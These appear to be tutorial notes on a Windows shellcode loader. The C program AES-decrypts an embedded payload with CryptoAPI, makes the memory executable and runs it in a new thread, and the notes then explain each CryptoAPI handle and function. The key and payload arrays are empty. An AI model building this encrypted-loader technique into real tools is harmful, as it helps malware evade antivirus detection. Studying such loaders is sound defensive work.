
Code snippet
```c
#include <windows.h>
#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <wincrypt.h>
#pragma comment (lib, "crypt32.lib")
#pragma comment (lib, "advapi32")
#include <psapi.h>


int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
        HCRYPTPROV hProv;
        HCRYPTHASH hHash;
        HCRYPTKEY hKey;

        if (!CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)){
                return -1;
        }
        if (!CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)){
                return -1;
        }
        if (!CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0)){
                return -1;              
        }
        if (!CryptDeriveKey(hProv, CALG_AES_256, hHash, 0,&hKey)){
                return -1;
        }
        
        if (!CryptDecrypt(hKey, (HCRYPTHASH) NULL, 0, 0, payload, &payload_len)){
                return -1;
        }
        
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
        
        return 0;
}


int main(void) {
    
	void * exec_mem;
	BOOL rv;
	HANDLE th;
    DWORD oldprotect = 0;

	char key[] = 
	unsigned char calc_payload[] = 
	unsigned int calc_len = sizeof(calc_payload);
	
	// Allocate memory for payload
	exec_mem = VirtualAlloc(0, calc_len, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
	printf("%-20s : 0x%-016p\n", "calc_payload addr", (void *)calc_payload);
	printf("%-20s : 0x%-016p\n", "exec_mem addr", (void *)exec_mem);

	printf("\nHit me 1st!\n");
	getchar();

	// Decrypt payload
	AESDecrypt((char *) calc_payload, calc_len, key, sizeof(key));
	
	// Copy payload to allocated buffer
	RtlMoveMemory(exec_mem, calc_payload, calc_len);
	
	// Make the buffer executable
	rv = VirtualProtect(exec_mem, calc_len, PAGE_EXECUTE_READ, &oldprotect);

	printf("\nHit me 2nd!\n");
	getchar();

	// If all good, launch the payload
	if ( rv != 0 ) {
			th = CreateThread(0, 0, (LPTHREAD_START_ROUTINE) exec_mem, 0, 0, 0);
			WaitForSingleObject(th, -1);
	}

	return 0;
}

```

---

Encrypt payload - take the key
```bash
python aesencrypt.py calc.bin
```

---

In Windows API, you can use and older **Cryptographic API (CryptoAPI)** to perform AES encryption and decryption with functions like `CryptAcquireContextW()`, `CryptHashData()`, `CryptEncrypt()` or `CryptDecrypt()`. But Win API delivers another, newer API - the **Cryptography API: Next Generation** (CNG) with several functions for AES, ex. `BCryptOpenAlgorithmProvider()`, `BCryptGenerateSymmetricKey()`, `BCryptEncrypt()`, etc.

#### Decrypting AES payload algorithm (C-like pseudo-code)

```c
// 1. open a handle hProv to a Cryptographic Service Provider - a module
// implementing specific crypto algorithms, like RSA, AES, etc.
CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT)

// 2. prepare a new hashing object to generate a SHA-256 hash from the provided key
CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash)

// 3. create SHA-256 hash from the key
CryptHashData(hHash, key, keylen, 0)

// 4. derive a symmetric AES-256 key from the hash
CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey)

// 5. finally, decrypt the payload
CryptDecrypt(hKey, NULL, 0, 0, payload, &payload_len)
```
---
#### CrytoAPI Handle Declaration

```c
int AESDecrypt(char * payload, unsigned int payload_len, char * key, size_t keylen) {
    HCRYPTPROV hProv;
    HCRYPTHASH hHash;
    HCRYPTKEY hKey;
    ...
}
```
These three variables are handles (think of them as "pointers to internal crypto objects") used by the Windows CryptoAPI to manage cryptographic operations.

1. `HCRYPTPROV hProv;`

“Cryptographic Provider Handle”

This identifies a Crypto Service Provider (CSP) — essentially, a software module that implements cryptographic algorithms.

When you call:

```c
CryptAcquireContextW(&hProv, NULL, NULL, PROV_RSA_AES, CRYPT_VERIFYCONTEXT);
```
Windows gives you a handle to a provider that supports AES operations.
> Simply put: The cryptographic environment where all your keys, hashes, and operations happen.
You need hProv as the first argument in almost every CryptoAPI function (to tell Windows which provider to use).

2. `HCRYPTHASH hHash;`

“Hash Object Handle”

This represents a hash object that you create and feed data into.
You make it with:
```c
CryptCreateHash(hProv, CALG_SHA_256, 0, 0, &hHash);
```
Then feed the key bytes into it:
```c
CryptHashData(hHash, (BYTE*)key, (DWORD)keylen, 0);
```

That computes the SHA-256 hash of your key.
The resulting hash value isn’t retrieved directly — it’s used as the base input to derive an AES key later.

> Simply put: A “temporary workspace” that holds the hash of your key material until you turn it into a symmetric key.

3. HCRYPTKEY hKey;

“Key Handle”

This is a handle to a symmetric encryption key object (like your AES-256 key).

You get it by calling:
```c
CryptDeriveKey(hProv, CALG_AES_256, hHash, 0, &hKey);
```
Windows takes the hashed data from hHash, processes it internally, and generates an AES-256 key object — then gives you back a handle to it.

You’ll use this handle to decrypt your payload:
```c
CryptDecrypt(hKey, 0, 0, 0, payload, &payload_len);
```
> Simply put: The actual decryption key object created from your hash.

##### 1, 2 ,3... DECRYPT!
```c
[HCRYPTPROV]  →  [HCRYPTHASH]  →  [HCRYPTKEY]
     |                 |                 |
     v                 v                 v
 Crypto Provider   Hash of key     Derived AES Key
```
Each one depends on the one before it:

1. You need a provider (hProv) to create anything else.

2. You use that provider to create a hash object (hHash).

3. You use that hash to derive an AES key object (hKey).

Finally, you use hKey to decrypt the payload.

---
#### Key Windows API functions

[**_CryptAcquireContextW()_**](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptacquirecontexta) is used to acquire a handle to a **Cryptographic Service Provider** (CSP) and, if necessary, to create a new key container. In other words, this function helps to establish a cryptographic context that allows applications to access and use cryptographic services provided by the CSP. A CSP is a software module that implements cryptographic algorithms and provides services such as encryption, decryption, hashing, and digital signatures. This function can be found in the _advapi32.dll_ library.

`CryptAcquireContextW()` function has the following prototype:

```c
BOOL WINAPI CryptAcquireContextW(
  HCRYPTPROV *phProv,        // pointer to a handle of a CSP [out param]
  LPCWSTR    pszContainer,   // key container name (null-terminated string). When dwFlags is set to CRYPT_VERIFYCONTEXT, pszContainer must be set to NULL
  LPCWSTR    pszProvider,    // null-terminated string that contains the name of the CSP to be used. If NULL == default provider
  DWORD      dwProvType,    // type of provider to acquire, ex. PROV_RSA_FULL, PROV_RSA_AES, PROV_DSS_DH, etc.
  DWORD      dwFlags        // flag values, usually set to zero. CRYPT_VERIFYCONTEXT for ephemeral keys
);
```

**Return value**

If the function succeeds, the function returns nonzero (`TRUE`). Otherwise, it returns zero (`FALSE`).

#### So what does CRYPT_VERIFYCONTEXT do?

This flag tells Windows:

“I don’t need to store or access any persistent keys — just give me a temporary, in-memory cryptographic context so I can do hashing, encryption, or decryption.”

---

[**_CryptCreateHash()_**](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptcreatehash) is used to create a handle to a hash object for a particular hash algorithm. This function can be found in the _advapi32.dll_ library.

`CryptCreateHash()` function has the following prototype:

```c
BOOL WINAPI CryptCreateHash(
  HCRYPTPROV hProv,    // handle to a CSP created by a call to CryptAcquireContext()
  ALG_ID     Algid,    // identifies the hash algorithm to use, ex. CALG_SHA_256, CALG_AES_128, CALG_ECDH, etc.
  HCRYPTKEY  hKey,     // type of hash algorithm is a keyed hash (like MAC or HMAC). Zero if nonkeyed algos
  DWORD      dwFlags,  // 0 or CRYPT_SECRETDIGEST (not used)
  HCRYPTHASH *phHash   // address to which the function copies a handle to the new hash object (pointer)
);
```

**Return value**

If the function succeeds, the function returns nonzero (`TRUE`). Otherwise, it returns zero (`FALSE`).

---

[**_CryptHashData()_**](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-crypthashdata) is used for hashing data using various hash algorithms provided by the operating system. This function can be found in the _advapi32.dll_ library.

`CryptHashData()` function has the following prototype:

```c
BOOL CryptHashData(
  HCRYPTHASH hHash,      // handle of the hash object
  const BYTE *pbData,    // pointer to a buffer that contains the data to be added to the hash object (the key) must be casted
  DWORD      dwDataLen,  // number of bytes of data to be added (keyl lenght) must be casted
  DWORD      dwFlags     // 0 - nothing, 0x1 - CRYPT_USERDATA
);
```

**Return value**

If the function succeeds, the function returns nonzero (`TRUE`). Otherwise, it returns zero (`FALSE`).

> In the `AESDecrypt` function `keylen` is taken in as a `size_t` because it will properly represent the literal `sizeof(key)`.
> 
> We dont cast it to a `DWORD` in the function because size_t is the correct,portable type for representing a data buffer size in C code and a `DWORD` is a **Windows-specific 32-bit type** used _only_ when interfacing with the Windows API.

|Layer|Type|Why|
|---|---|---|
|Your C code|`size_t`|portable, represents generic memory size|
|Windows API boundary|`DWORD`|required by WinAPI prototype|

---

[**_CryptDeriveKey()_**](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptderivekey) generates cryptographic [session keys](https://learn.microsoft.com/en-us/windows/desktop/SecGloss/s-gly) derived from a base data value. This function guarantees that when the same CSP and algorithms are used, the keys generated from the same base data are identical. The base data can be a password or any other user data. This function can be found in the _advapi32.dll_ library.

> Basically you give it a hash of your secret material, tell it “make an AES key from that,” and it returns a usable key object.

`CryptDeriveKey()` function has the following prototype:

```c
BOOL CryptDeriveKey(
  HCRYPTPROV hProv,      // handle of a CSP created by a call to CryptAcquireContext()
  ALG_ID     Algid,      // identifies the hash algorithm to use, ex. CALG_AES_256, CALG_AES_128, CALG_ECDH, etc. 
  HCRYPTHASH hBaseData,  // handle to a hash object that has been fed the exact base data
  DWORD      dwFlags,    // type of key generated, can be zero or one or more values, ex. CRYPT_CREATE_SALT, CRYPT_EXPORTABLE, CRYPT_UPDATE_KEY, etc.
  HCRYPTKEY  *phKey      // pointer to a variable to receive the address of the handle of the newly generated key
);
```

**Return value**

If the function succeeds, the function returns nonzero (`TRUE`). Otherwise, it returns zero (`FALSE`).


---

[**_CryptDecrypt()_**](https://learn.microsoft.com/en-us/windows/win32/api/wincrypt/nf-wincrypt-cryptdecrypt) is used for decrypting encrypted data using the same cryptographic key. This function can be found in the _advapi32.dll_ library.

`CryptDecrypt()` function has the following prototype:

```c
BOOL CryptDecrypt(
  HCRYPTKEY hKey,        // handle to the key to use for the decryption
  HCRYPTHASH hHash,      // handle to a hash object. If no hash, must be zero
  BOOL      Final,       // specifies whether this is the last section in a series being decrypted. If TRUE - the last block.
  DWORD     dwFlags,     // possible values: CRYPT_OAEP or CRYPT_DECRYPT_RSA_NO_PADDING_CHECK
  BYTE      *pbData,     // pointer to a buffer that contains the data to be decrypted. After the decryption, the plaintext is placed back into this same buffer.
  DWORD     *pdwDataLen  // length of the pbData buffer
);
```

**Return value**

If the function succeeds, the function returns nonzero (`TRUE`). Otherwise, it returns zero (`FALSE`).

---

#### Cleanup

```c
        CryptReleaseContext(hProv, 0);
        CryptDestroyHash(hHash);
        CryptDestroyKey(hKey);
```

